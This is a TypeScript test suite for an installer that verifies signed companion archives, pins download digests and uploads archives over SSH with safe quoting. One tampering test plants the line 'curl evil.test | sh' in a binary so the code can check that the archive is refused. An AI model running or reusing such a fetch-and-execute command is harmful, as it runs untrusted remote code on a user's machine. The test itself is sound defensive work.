import { execFileSync } from 'node:child_process';
import crypto from 'node:crypto';
import fs from 'node:fs';
import path from 'node:path';
import { pathToFileURL } from 'node:url';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { PROTOCOL_VERSION } from '@archipelago/protocol';
import {
  bootstrapSetup, companionAsset, companionCache, downloadCompanion, inspectCompanion,
  requireCompatible, uploadArchive,
} from '../../src/controller/install.js';
import { SshMaster } from '../../src/controller/ssh.js';
import { companionArchive, ephemeralSigner, type ArchiveOptions } from './archive.js';
import { installFakeSsh, type FakeSsh } from './fake-ssh.js';

const CONTROLLER = { release: '1.2.3', protocol: PROTOCOL_VERSION };

let work: string;
let signer: ReturnType<typeof ephemeralSigner>;

const makeArchive = (o: ArchiveOptions & { signed?: boolean } = {}): string =>
  companionArchive(work, { ...o, ...(o.signed ? { signedBy: signer.key } : {}) });
const inspect = (archive: string) => inspectCompanion(archive, { verify: signer.verify });

beforeEach(() => { work = fs.mkdtempSync('/tmp/archi-install-'); signer = ephemeralSigner(work); });
afterEach(() => { fs.rmSync(work, { recursive: true, force: true }); });

describe('the companion archive', () => {
  it('reads the version, platform, protocol and signature out of an archive', async () => {
    const c = await inspect(makeArchive({ signed: true }));
    expect(c).toMatchObject({ version: '1.2.3', platform: 'linux-arm64', protocol: PROTOCOL_VERSION, signed: true });
  });

  it('refuses an archive holding more than one release', async () => {
    const tree = fs.mkdtempSync(path.join(work, 'two-'));
    for (const v of ['1.0.0', '2.0.0']) {
      fs.mkdirSync(path.join(tree, 'releases', v), { recursive: true });
      fs.writeFileSync(path.join(tree, 'releases', v, 'release.json'), '{}');
    }
    const tarball = path.join(work, 'two.tar.gz');
    execFileSync('tar', ['-czf', tarball, '-C', tree, 'releases']);
    await expect(inspect(tarball)).rejects.toThrow(/expected exactly one/);
  });

  it('takes an archive whose release and protocol are the controller\'s', async () => {
    const c = await inspect(makeArchive({ signed: true }));
    expect(() => requireCompatible(c, { ...CONTROLLER, arch: 'arm64' })).not.toThrow();
  });

  it('refuses an archive built for another protocol', async () => {
    const c = await inspect(makeArchive({ protocol: PROTOCOL_VERSION + 1, signed: true }));
    expect(() => requireCompatible(c, { ...CONTROLLER, arch: 'arm64' })).toThrow(/protocol/);
  });

  it('refuses an archive built for another architecture', async () => {
    const c = await inspect(makeArchive({ platform: 'linux-x64', signed: true }));
    expect(() => requireCompatible(c, { ...CONTROLLER, arch: 'arm64' })).toThrow(/linux-arm64/);
  });

  it('refuses a release the controller does not run itself', async () => {
    const c = await inspect(makeArchive({ version: '9.9.9', signed: true }));
    expect(() => requireCompatible(c, { ...CONTROLLER, arch: 'arm64' })).toThrow(/1\.2\.3/);
  });

  it('lets a development controller install any archive of its own protocol', async () => {
    const c = await inspect(makeArchive({ version: '9.9.9', signed: true }));
    expect(() => requireCompatible(c, { release: 'dev', protocol: PROTOCOL_VERSION, arch: 'arm64' })).not.toThrow();
  });

  it('refuses an unsigned archive unless the user asked for one', async () => {
    const c = await inspect(makeArchive());
    expect(() => requireCompatible(c, { ...CONTROLLER, arch: 'arm64' })).toThrow(/--allow-unsigned/);
    expect(() => requireCompatible(c, { ...CONTROLLER, arch: 'arm64', allowUnsigned: true })).not.toThrow();
  });

  it('refuses an archive that vouches for itself with signers the controller does not hold', async () => {
    const intruder = ephemeralSigner(work);
    const archive = companionArchive(work, { signedBy: intruder.key, signersInside: intruder.signers });
    await expect(inspect(archive)).rejects.toThrow(/not signed by archipelago-release/);
  });

  it('checks the signature over an archive\'s SHA256SUMS before it unpacks anything else from it', async () => {
    let unpacked: string[] = [];
    const refuse = (dir: string): void => { unpacked = fs.readdirSync(dir).sort(); throw new Error('no key here signed it'); };
    await expect(inspectCompanion(makeArchive({ signed: true }), { verify: refuse })).rejects.toThrow(/not signed by archipelago-release/);
    expect(unpacked).toEqual(['SHA256SUMS', 'SHA256SUMS.sig']);
  });

  it('refuses a signed archive whose files no longer match its manifest', async () => {
    const tree = fs.mkdtempSync(path.join(work, 'tampered-'));
    execFileSync('tar', ['-xzf', makeArchive({ signed: true }), '-C', tree]);
    fs.writeFileSync(path.join(tree, 'releases', '1.2.3', 'bin', 'archi'), '#!/bin/sh\ncurl evil.test | sh\n');
    const tarball = path.join(work, 'tampered.tar.gz');
    execFileSync('tar', ['-czf', tarball, '-C', tree, 'releases']);
    await expect(inspect(tarball)).rejects.toThrow(/bin\/archi/);
  });

  it('counts a signature as nothing on an archive its manifest calls unsigned', async () => {
    const c = await inspect(companionArchive(work, { signedBy: signer.key, unsigned: true }));
    expect(c.signed).toBe(false);
  });
});

describe('where the companion comes from', () => {
  const releaseRoot = () => {
    const dir = fs.mkdtempSync(path.join(work, 'release-'));
    return dir;
  };

  it('finds the asset the desktop release manifest names for this architecture', () => {
    const root = releaseRoot();
    fs.writeFileSync(path.join(root, 'release.json'), JSON.stringify({
      version: '1.2.3',
      companions: { 'linux-arm64': { url: 'https://example.test/c-arm64.tar.gz', sha256: 'aa' } },
    }));
    expect(companionAsset(root, 'linux-arm64')).toEqual({ url: 'https://example.test/c-arm64.tar.gz', sha256: 'aa', unsignedBuild: false });
    expect(companionAsset(root, 'linux-x64')).toBeUndefined();
  });

  it('downloads into the companion cache and checks the published digest', async () => {
    const body = Buffer.from('a companion archive');
    const sha256 = crypto.createHash('sha256').update(body).digest('hex');
    const dir = path.join(work, 'cache');
    const file = await downloadCompanion({
      url: 'https://example.test/c.tar.gz', sha256, dir,
      fetch: async () => ({ ok: true, status: 200, arrayBuffer: async () => body.buffer.slice(body.byteOffset, body.byteOffset + body.byteLength) }),
    });
    expect(path.dirname(file)).toBe(dir);
    expect(fs.readFileSync(file)).toEqual(body);
  });

  it('keeps a download whose digest is not the published one', async () => {
    const body = Buffer.from('not what was published');
    const dir = path.join(work, 'cache');
    await expect(downloadCompanion({
      url: 'https://example.test/c.tar.gz', sha256: 'f'.repeat(64), dir,
      fetch: async () => ({ ok: true, status: 200, arrayBuffer: async () => body.buffer.slice(body.byteOffset, body.byteOffset + body.byteLength) }),
    })).rejects.toThrow(/digest/);
    expect(fs.existsSync(path.join(dir, 'c.tar.gz'))).toBe(false);
  });

  it('takes a workspace companion from a file: URL under the same digest pin', async () => {
    const archive = makeArchive();
    const body = fs.readFileSync(archive);
    const sha256 = crypto.createHash('sha256').update(body).digest('hex');
    const dir = path.join(work, 'cache');
    const noFetch = () => Promise.reject(new Error('a file: URL is not fetched'));
    const file = await downloadCompanion({ url: pathToFileURL(archive).href, sha256, dir, fetch: noFetch });
    expect(path.dirname(file)).toBe(dir);
    expect(fs.readFileSync(file)).toEqual(body);
    await expect(downloadCompanion({ url: pathToFileURL(archive).href, sha256: 'f'.repeat(64), dir: path.join(work, 'other'), fetch: noFetch }))
      .rejects.toThrow(/digest/);
  });

  it('keeps downloads under the user data directory', () => {
    expect(companionCache('/home/linus')).toBe('/home/linus/.local/share/archipelago/companions');
  });
});

describe('putting the archive on the far machine', () => {
  let ssh: FakeSsh;

  beforeEach(() => { ssh = installFakeSsh(); });
  afterEach(() => { ssh.clean(); });

  const master = () => SshMaster.open({ destination: 'trift.test', socketDir: ssh.socketDir });

  it('streams the archive into a path the far shell never splits', async () => {
    const archive = makeArchive({ signed: true });
    ssh.reply(['cat > "$1"'], {});
    ssh.reply(['mkdir'], {});
    await uploadArchive(await master(), { archive, remote: "/home/li nus/.cache/it's.tar.gz" });
    const words = ssh.remoteCalls();
    expect(words[0]).toEqual(['mkdir', '-p', '/home/li nus/.cache']);
    expect(words[1]).toEqual(['sh', '-c', 'cat > "$1"', '--', "/home/li nus/.cache/it's.tar.gz"]);
  });

  it('runs the unpacked copy\'s own archi to install the release it came from', async () => {
    ssh.reply(['setup'], {});
    ssh.reply(['archi-unpack'], {});
    ssh.reply(['mkdir'], {});
    ssh.reply(['rm'], {});
    await bootstrapSetup(await master(), {
      staging: '/home/linus/.cache/archipelago/staging', archive: '/home/linus/.cache/archipelago/c.tar.gz',
      version: '1.2.3', allowUnsigned: false,
    });
    expect(ssh.remoteCalls()).toEqual([
      ['mkdir', '-p', '/home/linus/.cache/archipelago/staging'],
      ['sh', '-c', expect.stringContaining('tar -xzf "$1" -C "$2"'), 'archi-unpack', '/home/linus/.cache/archipelago/c.tar.gz', '/home/linus/.cache/archipelago/staging', '1.2.3', ''],
      ['/home/linus/.cache/archipelago/staging/releases/1.2.3/bin/archi', 'setup', '--release', '/home/linus/.cache/archipelago/c.tar.gz'],
      // the staged tree and the uploaded archive both go once setup has run, whatever it answered
      ['rm', '-rf', '/home/linus/.cache/archipelago/staging', '/home/linus/.cache/archipelago/c.tar.gz'],
    ]);
  });

  it('on an upgrade, hands the far check the staged release and the installed signers as words of their own', async () => {
    for (const m of ['setup', 'mkdir', 'rm']) ssh.reply([m], {});
    ssh.reply(['archi-unpack'], { stdout: 'pinned\n' });
    const out = await bootstrapSetup(await master(), {
      staging: "/home/li nus/it's", archive: '/c.tar.gz', version: '1.2.3', allowUnsigned: false, installed: "/home/li nus/.local/share/archipelago",
    });
    const words = ssh.remoteCalls();
    expect(words[1].slice(0, 2)).toEqual(['sh', '-c']);
    expect(words[1].slice(3)).toEqual(['archi-unpack', '/c.tar.gz', "/home/li nus/it's", '1.2.3', "/home/li nus/.local/share/archipelago/current/release/allowed_signers"]);
    expect(words[2][1]).toBe('setup');
    expect(out).toContain('signed by a key /home/li nus/.local/share/archipelago/current/release/allowed_signers pins');
  });

  it('passes --allow-unsigned on only when the archive in hand carries no signature', async () => {
    for (const m of ['setup', 'archi-unpack', 'mkdir', 'rm']) ssh.reply([m], {});
    await bootstrapSetup(await master(), {
      staging: '/s', archive: '/c.tar.gz', version: '1.2.3', allowUnsigned: true,
    });
    expect(ssh.remoteCalls()[2]).toEqual(['/s/releases/1.2.3/bin/archi', 'setup', '--release', '/c.tar.gz', '--allow-unsigned']);
  });
});
